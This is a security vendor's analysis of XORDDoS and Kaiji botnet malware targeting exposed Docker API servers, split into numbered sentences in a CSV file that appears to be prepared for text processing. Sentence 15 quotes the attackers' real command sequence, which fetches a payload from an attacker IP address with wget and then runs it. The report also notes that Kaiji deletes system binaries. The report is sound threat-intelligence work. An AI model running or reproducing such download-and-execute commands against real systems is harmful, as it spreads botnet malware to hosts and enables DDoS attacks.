Number,Content
Sentence 1,"XORDDoS, Kaiji Variants Target Exposed Docker Servers
We detected variants of two Linux botnet malware - XORDDoS and Kaiji - targeting exposed Docker servers."
Sentence 2,"XORDDoS infiltrated the Docker server to infect all containers it hosts, while the Kaiji attack used its own container with its DDoS malware."
Sentence 3,"By: Augusto Remillano II, Patrick Noel Collado, Karen Ivy Titiwa
June 22, 2020
Read time: 4 min (981 words)

Subscribe
"
Sentence 4,"
We have recently detected variants of two existing Linux botnet malware types targeting exposed Docker servers; these are XORDDoS malware (detected by Trend Micro as Backdoor.Linux.XORDDOS.AE) and Kaiji DDoS malware (detected by Trend Micro as DDoS.Linux.KAIJI.A)."
Sentence 5,"Having Docker servers as their target is a new development for both XORDDoS and Kaiji; XORDDoS was known for targeting Linux hosts on cloud systems, while recently discovered Kaiji was first reported to affect internet of things (IoT) devices."
Sentence 6,Attackers usually used botnets to perform brute-force attacks after scanning for open Secure Shell (SSH) and Telnet ports.
Sentence 7,"Now, they also searched for Docker servers with exposed ports (2375)."
Sentence 8,"Port 2375, one of the two ports Docker API uses, is for unencrypted and unauthenticated communication."
Sentence 9,"There is, however, a notable difference between the two malware variants’ method of attack."
Sentence 10,"While the XORDDoS attack infiltrated the Docker server to infect all the containers hosted on it, the Kaiji attack deploys its own container that will house its DDoS malware."
Sentence 11,"These malware variants facilitate distributed denial of service (DDoS), a type of attack designed to disable, disrupt, or shut down a network, website, or service."
Sentence 12,This is done by using multiple systems to overwhelm the target system with traffic until it becomes inaccessible to other users.
Sentence 13,"Analysis of XORDDoS malware
The XORDDoS infection started with the attackers searching for hosts with exposed Docker API ports (2375)."
Sentence 14,They then sent a command that listed the containers hosted on the Docker server.
Sentence 15,"Afterwards, the attackers executed the following sequence of commands to all containers, infecting all of them with the XORDDoS malware:

wget http://122.51.133.49:10086/VIP –O VIP
chmod 777 VIP
./VIP
The XORDDoS payload (detected by Trend Micro as Backdoor.Linux.XORDDOS.AE) still used the XOR-key it used in other recorded attacks, BB2FA36AAA9541F0, to encrypt its strings and to communicate with the command and control (C&C) server."
Sentence 16,It also created multiple copies of itself inside the machine as a persistence mechanism.
Sentence 17,Figure 1.
Sentence 18,"Code snippet showing XORDDoS creating multiple copies of itself
"
Sentence 19,"

The payload initiated SYN, ACK, and DNS types of DDoS attacks."
Sentence 20,Figure 2.
Sentence 21,"Code snippet showing the types of DDoS attack that XORDDoS can launch
"
Sentence 22,"

It is also capable of downloading and executing a follow-up malware, or updating itself."
Sentence 23,Figure 3.
Sentence 24,Code snippet showing XORDDoS’ capability to download and update files.
Sentence 25,"

It gathered the following data, which are relevant to its attempt to initiate a DDoS attack:

CPU Information
MD5 of Running Process
Memory Information
Network Speed
PID of Running Process
It should be noted that most of the behaviors exhibited by this particular XORDDoS variant have already been observed in earlier variants of the malware."
Sentence 26,"Upon further investigation of the URL linked to the attacker, we found other malware such as Backdoor.Linux.DOFLOO.AB, a variant of Dofloo/AESDDoS Linux botnet malware that we witnessed  targeting exposed Docker APIs previously."
Sentence 27,"Analysis of Kaiji malware
Similar with the XORDDoS malware, Kaiji is now also targeting exposed Docker servers for propagation."
Sentence 28,Its operator also scanned the internet for hosts with exposed port 2375.
Sentence 29,"After finding a target, they pinged the Docker server before deploying a rogue ARM container that executed the Kaiji binary."
Sentence 30,"The script 123.sh (detected by Trend Micro as Trojan.SH.KAIJI.A) downloaded and executed the malware payload, linux_arm (detected by Trend Micro as DDoS.Linux.KAIJI.A)."
Sentence 31,"Afterwards, the script also removed other Linux binaries that are basic components of the operating system but are not necessary for its DDoS operation."
Sentence 32,Figure 4.
Sentence 33,"Query that downloads and executes 123.sh
"
Sentence 34,"

Figure 5."
Sentence 35,"Code snippet showing the removal of Linux binaries
"
